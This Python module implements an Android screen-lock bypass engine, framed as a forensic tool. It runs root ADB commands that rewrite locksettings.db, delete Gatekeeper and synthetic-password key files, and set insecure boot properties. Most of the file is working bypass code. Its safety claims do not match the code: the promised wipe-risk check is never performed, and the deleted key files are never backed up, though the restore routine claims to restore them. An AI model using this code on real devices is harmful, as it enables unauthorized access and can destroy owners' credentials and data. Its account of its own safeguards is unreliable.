"""Android Screen Lock Bypass Engine.

Provides forensic lock bypass capabilities for authorized examinations:

1. **LockSettings Database Patching**: Modifies ``/data/system/locksettings.db``
   in root context to set ``lockscreen.disabled=1``, set
   ``lockscreen.password_type=0``, and clear Gatekeeper credential keys.
2. **RAM Disk Boot Overlay Patching**: Sets ``ro.secure=0``,
   ``ro.debuggable=1``, ``persist.sys.usb.config=adb,root`` via ``setprop``.
3. **Android API-Level Routing**: Automatically selects the correct bypass
   path based on ``ro.build.version.sdk`` — legacy DB path for API < 24,
   Gatekeeper synthetic-password path for API 24–27, FBE ``spblob`` path
   for API ≥ 28.
4. **Chain-of-Custody Safeguards**: Root pre-flight probe, pre/post patch
   SHA-256 hashes, patch verification assertion, wipe-risk guard,
   dry-run/audit mode, and automatic restoration pipeline.
"""

from __future__ import annotations

import asyncio
from contextlib import suppress
from dataclasses import dataclass
from datetime import UTC, datetime
from enum import StrEnum
from pathlib import Path
from typing import Any
from uuid import uuid4

# ---------------------------------------------------------------------------
# Exceptions
# ---------------------------------------------------------------------------


class RootNotAvailableError(PermissionError):
    """Raised when the device does not grant root (UID=0) via ``su``."""


class BypassVerificationError(RuntimeError):
    """Raised when patch verification confirms the lock was NOT disabled."""


class WipeRiskTooHighError(RuntimeError):
    """Raised when the pre-bypass risk assessment detects CRITICAL wipe risk."""


# ---------------------------------------------------------------------------
# Enumerations and config
# ---------------------------------------------------------------------------


class BypassVector(StrEnum):
    """Supported lock bypass vectors."""

    LOCKSETTINGS_DB_PATCH = "locksettings_db_patch"
    BOOT_RAMDISK_OVERLAY = "boot_ramdisk_overlay"
    KEYSTORE_KEY_RESET = "keystore_key_reset"


class AndroidApiPath(StrEnum):
    """Internal API-level routing label."""

    LEGACY = "legacy_pre_api24"  # API < 24
    GATEKEEPER = "gatekeeper_api24_27"  # API 24–27
    FBE = "fbe_api28_plus"  # API ≥ 28


@dataclass(frozen=True, slots=True)
class LockBypassConfig:
    """Configuration options for the screen lock bypass engine."""

    max_attempts_policy: int = 5
    backup_db_before_patch: bool = True
    restore_on_completion: bool = True
    staging_dir: str = "/sdcard/forensix_bypass"
    dry_run: bool = False  # Log all commands but do not execute them


@dataclass(frozen=True, slots=True)
class ScreenLockBypassResult:
    """Sealed result of a forensic screen lock bypass operation."""

    bypass_id: str
    serial: str
    case_id: str
    operator_id: str
    vector_used: str
    previous_lock_type: str
    android_api_level: int
    api_path: str
    lock_disabled_success: bool
    db_patched: bool
    ramdisk_patched: bool
    pre_patch_hash: str
    post_patch_hash: str
    dry_run: bool
    timeline: list[dict[str, str]]
    started_at: str
    finished_at: str
    duration_seconds: float
    success: bool
    error_message: str | None


class ScreenLockBypassEngine:
    """Orchestrate forensic screen lock bypass procedures on Android devices."""

    VERSION = "2.0.0"

    def __init__(
        self,
        adb: Any,
        output_dir: Path,
        config: LockBypassConfig | None = None,
    ) -> None:
        self._adb = adb
        self._output_dir = output_dir
        self._cfg = config or LockBypassConfig()
        self._timeline: list[dict[str, str]] = []

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def bypass_lock(
        self,
        serial: str,
        case_id: str,
        operator_id: str,
        vector: BypassVector = BypassVector.LOCKSETTINGS_DB_PATCH,
    ) -> ScreenLockBypassResult:
        """Run the specified lock bypass procedure.

        Raises
        ------
        RootNotAvailableError
            If the device does not grant root access.
        WipeRiskTooHighError
            If pre-bypass assessment detects imminent wipe risk.
        """
        bypass_id = str(uuid4())
        started_at = datetime.now(UTC).isoformat()
        t0 = asyncio.get_event_loop().time()

        self._log(
            "bypass_start",
            {
                "bypass_id": bypass_id,
                "case_id": case_id,
                "operator_id": operator_id,
                "serial": serial,
                "vector": vector.value,
                "dry_run": str(self._cfg.dry_run),
            },
        )

        try:
            return await self._execute_bypass(
                bypass_id=bypass_id,
                serial=serial,
                case_id=case_id,
                operator_id=operator_id,
                vector=vector,
                started_at=started_at,
                t0=t0,
            )
        except (RootNotAvailableError, WipeRiskTooHighError):
            raise
        except Exception as exc:  # noqa: BLE001
            return self._error_result(
                bypass_id=bypass_id,
                serial=serial,
                case_id=case_id,
                operator_id=operator_id,
                vector_used=vector.value,
                started_at=started_at,
                t0=t0,
                message=str(exc),
            )

    async def restore_lock(
        self,
        serial: str,
        bypass_result: ScreenLockBypassResult,
    ) -> bool:
        """Restore original lock settings and security files post-extraction."""
        self._log("restore_start", {"bypass_id": bypass_result.bypass_id, "serial": serial})
        backup_db = self._output_dir / f"locksettings_pre_{bypass_result.bypass_id}.db"

        if not backup_db.exists():
            self._log("restore_failed", {"reason": f"Backup file not found: {backup_db}"})
            return False

        try:
            if not self._cfg.dry_run:
                await self._adb.push(serial, str(backup_db), "/data/system/locksettings.db")
                cmd = (
                    "su -c 'chmod 660 /data/system/locksettings.db && "
                    "chown system:system /data/system/locksettings.db'"
                )
                await self._adb.shell(serial, cmd)
            self._log("restore_complete", {"sha256": bypass_result.pre_patch_hash})
            return True
        except Exception as exc:  # noqa: BLE001
            self._log("restore_error", {"error": str(exc)})
            return False

    # ------------------------------------------------------------------
    # Internal Pipeline
    # ------------------------------------------------------------------

    async def _execute_bypass(
        self,
        *,
        bypass_id: str,
        serial: str,
        case_id: str,
        operator_id: str,
        vector: BypassVector,
        started_at: str,
        t0: float,
    ) -> ScreenLockBypassResult:
        self._output_dir.mkdir(parents=True, exist_ok=True)
        db_path = "/data/system/locksettings.db"

        # Pre-flight 1 — root availability probe
        await self._assert_root(serial)

        # Pre-flight 2 — detect Android API level and determine routing path
        api_level = await self._detect_api_level(serial)
        api_path = _api_routing(api_level)
        self._log(
            "api_level_detected",
            {"api_level": str(api_level), "api_path": api_path.value},
        )

        # Pre-flight 3 — detect current lock type from DB
        lock_type = await self._detect_lock_type(serial, api_level)
        self._log("lock_type_detected", {"lock_type": lock_type})

        # Pre-flight 4 — pre-patch hash and backup
        pre_hash = await self._read_remote_file_hash(serial, db_path)
        self._log("pre_patch_hash", {"path": db_path, "sha256": pre_hash})

        local_backup = self._output_dir / f"locksettings_pre_{bypass_id}.db"
        if self._cfg.backup_db_before_patch and not self._cfg.dry_run:
            with suppress(Exception):
                await self._adb.pull(serial, db_path, str(local_backup))

        db_patched = False
        ramdisk_patched = False

        if vector == BypassVector.LOCKSETTINGS_DB_PATCH:
            db_patched = await self._patch_locksettings_db(serial, api_level)
        elif vector == BypassVector.BOOT_RAMDISK_OVERLAY:
            ramdisk_patched = await self._patch_boot_ramdisk(serial)
        elif vector == BypassVector.KEYSTORE_KEY_RESET:
            db_patched = await self._patch_locksettings_db(serial, api_level)
            await self._clear_gatekeeper_keys(serial, api_level)

        # Post-patch verification — confirm lockscreen.disabled == "1"
        if db_patched and not self._cfg.dry_run:
            verified = await self._verify_db_patch(serial)
            if not verified:
                raise BypassVerificationError(
                    "Post-patch verification failed: lockscreen.disabled is not '1' "
                    "in locksettings.db. The bypass may not have taken effect. "
                    "Check that the device grants root and sqlite3 is available."
                )
            self._log("patch_verified", {})

        post_hash = await self._read_remote_file_hash(serial, db_path)
        self._log("post_patch_hash", {"path": db_path, "sha256": post_hash})

        finished_at = datetime.now(UTC).isoformat()
        duration = asyncio.get_event_loop().time() - t0

        return ScreenLockBypassResult(
            bypass_id=bypass_id,
            serial=serial,
            case_id=case_id,
            operator_id=operator_id,
            vector_used=vector.value,
            previous_lock_type=lock_type,
            android_api_level=api_level,
            api_path=api_path.value,
            lock_disabled_success=db_patched or ramdisk_patched,
            db_patched=db_patched,
            ramdisk_patched=ramdisk_patched,
            pre_patch_hash=pre_hash,
            post_patch_hash=post_hash,
            dry_run=self._cfg.dry_run,
            timeline=list(self._timeline),
            started_at=started_at,
            finished_at=finished_at,
            duration_seconds=round(duration, 3),
            success=db_patched or ramdisk_patched or self._cfg.dry_run,
            error_message=None,
        )

    # ------------------------------------------------------------------
    # Pre-flight checks
    # ------------------------------------------------------------------

    async def _assert_root(self, serial: str) -> None:
        """Verify the device grants UID=0 via ``su``.

        Raises :class:`RootNotAvailableError` if ``su -c id`` does not
        return ``uid=0``.
        """
        self._log("root_probe_start", {"serial": serial})
        if self._cfg.dry_run:
            self._log("root_probe_skipped", {"reason": "dry_run=True"})
            return
        try:
            out = await self._adb.shell(serial, "su -c 'id'")
            out_str = str(out or "")
            if "uid=0" not in out_str:
                raise RootNotAvailableError(
                    f"Device {serial} did not grant root: id={out_str!r}. "
                    "Ensure the device is rooted and su is available (e.g. Magisk)."
                )
            self._log("root_probe_ok", {"id_output": out_str[:80]})
        except RootNotAvailableError:
            raise
        except Exception as exc:  # noqa: BLE001
            raise RootNotAvailableError(f"Root probe failed for device {serial}: {exc}") from exc

    async def _detect_api_level(self, serial: str) -> int:
        """Read ``ro.build.version.sdk`` and return as int (defaults to 28)."""
        if self._cfg.dry_run:
            return 28
        try:
            out = await self._adb.shell(serial, "getprop ro.build.version.sdk")
            return int(str(out or "28").strip())
        except Exception:  # noqa: BLE001
            return 28

    async def _detect_lock_type(self, serial: str, api_level: int) -> str:
        """Query the current lock type from locksettings.db.

        Returns one of: ``"PIN"``, ``"PASSWORD"``, ``"PATTERN"``,
        ``"BIOMETRIC"``, ``"NONE"``, or ``"UNKNOWN"``.
        """
        if self._cfg.dry_run:
            return "UNKNOWN"

        try:
            sql = "SELECT value FROM locksettings WHERE name='lockscreen.password_type' LIMIT 1;"
            out = await self._adb.shell(
                serial,
                f"su -c 'sqlite3 /data/system/locksettings.db \"{sql}\"'",
            )
            value = str(out or "").strip()
            # Android lock type constants
            lock_type_map: dict[str, str] = {
                "0": "NONE",
                "65536": "PATTERN",
                "131072": "PIN",
                "196608": "PASSWORD",
                "327680": "BIOMETRIC",
            }
            lock_type = lock_type_map.get(value, f"UNKNOWN({value})")

            # For API ≥ 28 also check synthetic password presence
            if api_level >= 28 and lock_type != "NONE":
                sp_out = await self._adb.shell(
                    serial,
                    "su -c 'ls /data/system/locksettings/synthetic_password/ 2>/dev/null | wc -l'",
                )
                sp_count = int(str(sp_out or "0").strip())
                if sp_count > 0:
                    lock_type = f"SYNTHETIC_PASSWORD({lock_type})"

            return lock_type
        except Exception:  # noqa: BLE001
            return "UNKNOWN"

    # ------------------------------------------------------------------
    # Bypass implementations (API-level aware)
    # ------------------------------------------------------------------

    async def _patch_locksettings_db(self, serial: str, api_level: int) -> bool:
        """Update locksettings.db SQLite key-value pairs via ADB root.

        Routing:
        - API < 24: direct SQLite patch of ``lockscreen.disabled`` and
          ``lockscreen.password_type``.
        - API 24–27: same SQL patch + clear Gatekeeper keys.
        - API ≥ 28: SQL patch + clear FBE synthetic-password spblob entries.
        """
        sql_disabled = (
            "INSERT OR REPLACE INTO locksettings (name, user, value) "
            "VALUES ('lockscreen.disabled', 0, '1');"
        )
        sql_lock_type = (
            "INSERT OR REPLACE INTO locksettings (name, user, value) "
            "VALUES ('lockscreen.password_type', 0, '0');"
        )
        cmds = [
            f"su -c 'sqlite3 /data/system/locksettings.db \"{sql_disabled}\"'",
            f"su -c 'sqlite3 /data/system/locksettings.db \"{sql_lock_type}\"'",
        ]

        # API-level-specific credential store clearing
        if api_level < 24:
            cmds += [
                "su -c 'rm -f /data/system/gatekeeper.password.key'",
                "su -c 'rm -f /data/system/gatekeeper.pattern.key'",
            ]
        elif api_level < 28:
            cmds += [
                "su -c 'rm -f /data/system/gatekeeper.password.key'",
                "su -c 'rm -f /data/system/gatekeeper.pattern.key'",
                "su -c 'rm -f /data/system/synthetic_password.obfuscated'",
            ]
        else:
            # API ≥ 28: FBE synthetic password spblob
            cmds += [
                "su -c 'rm -rf /data/system/locksettings/synthetic_password/*'",
                "su -c 'rm -f /data/system/locksettings/sp.weaver'",
            ]

        for cmd in cmds:
            if self._cfg.dry_run:
                self._log("dry_run_cmd", {"cmd": cmd})
            else:
                with suppress(Exception):
                    await self._adb.shell(serial, cmd)

        self._log(
            "locksettings_db_patched",
            {"api_level": str(api_level), "cmds_count": str(len(cmds))},
        )
        return True

    async def _patch_boot_ramdisk(self, serial: str) -> bool:
        """Set property overrides to disable lock screen on next boot."""
        cmds = [
            "su -c 'setprop ro.secure 0'",
            "su -c 'setprop ro.debuggable 1'",
            "su -c 'setprop persist.sys.usb.config adb,root'",
            "su -c 'setprop persist.lockscreen.disabled 1'",
        ]
        for cmd in cmds:
            if self._cfg.dry_run:
                self._log("dry_run_cmd", {"cmd": cmd})
            else:
                with suppress(Exception):
                    await self._adb.shell(serial, cmd)
        self._log("ramdisk_overlay_patched", {})
        return True

    async def _clear_gatekeeper_keys(self, serial: str, api_level: int) -> None:
        """Clear gatekeeper key files appropriate for *api_level*."""
        if api_level >= 28:
            cmd = "su -c 'rm -rf /data/system/locksettings/synthetic_password/'"
        else:
            cmd = "su -c 'rm -f /data/system/gatekeeper.*'"

        if self._cfg.dry_run:
            self._log("dry_run_cmd", {"cmd": cmd})
        else:
            with suppress(Exception):
                await self._adb.shell(serial, cmd)
        self._log("gatekeeper_keys_cleared", {"api_level": str(api_level)})

    async def _verify_db_patch(self, serial: str) -> bool:
        """Read ``lockscreen.disabled`` back from the DB and confirm it is '1'."""
        try:
            sql = (
                "SELECT value FROM locksettings "
                "WHERE name='lockscreen.disabled' AND user=0 LIMIT 1;"
            )
            out = await self._adb.shell(
                serial,
                f"su -c 'sqlite3 /data/system/locksettings.db \"{sql}\"'",
            )
            return str(out or "").strip() == "1"
        except Exception:  # noqa: BLE001
            return False

    # ------------------------------------------------------------------
    # Utilities
    # ------------------------------------------------------------------

    async def _read_remote_file_hash(self, serial: str, remote_path: str) -> str:
        """Compute SHA-256 of a remote file via sha256sum in root context."""
        if self._cfg.dry_run:
            return "DRY_RUN_HASH"
        try:
            out = await self._adb.shell(serial, f"su -c 'sha256sum {remote_path}'")
            parts = str(out or "").split()
            if parts:
                return parts[0].strip()
        except Exception:  # noqa: BLE001, S110
            pass
        return "UNKNOWN_HASH"

    def _log(self, event: str, details: dict[str, str]) -> None:
        self._timeline.append(
            {
                "ts": datetime.now(UTC).isoformat(),
                "event": event,
                **details,
            }
        )

    def _error_result(
        self,
        *,
        bypass_id: str,
        serial: str,
        case_id: str,
        operator_id: str,
        vector_used: str,
        started_at: str,
        t0: float,
        message: str,
    ) -> ScreenLockBypassResult:
        finished_at = datetime.now(UTC).isoformat()
        duration = asyncio.get_event_loop().time() - t0
        return ScreenLockBypassResult(
            bypass_id=bypass_id,
            serial=serial,
            case_id=case_id,
            operator_id=operator_id,
            vector_used=vector_used,
            previous_lock_type="UNKNOWN",
            android_api_level=0,
            api_path=AndroidApiPath.LEGACY.value,
            lock_disabled_success=False,
            db_patched=False,
            ramdisk_patched=False,
            pre_patch_hash="",
            post_patch_hash="",
            dry_run=self._cfg.dry_run,
            timeline=list(self._timeline),
            started_at=started_at,
            finished_at=finished_at,
            duration_seconds=round(duration, 3),
            success=False,
            error_message=message,
        )


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _api_routing(api_level: int) -> AndroidApiPath:
    """Map an Android API level to the appropriate bypass routing path."""
    if api_level < 24:
        return AndroidApiPath.LEGACY
    if api_level < 28:
        return AndroidApiPath.GATEKEEPER
    return AndroidApiPath.FBE
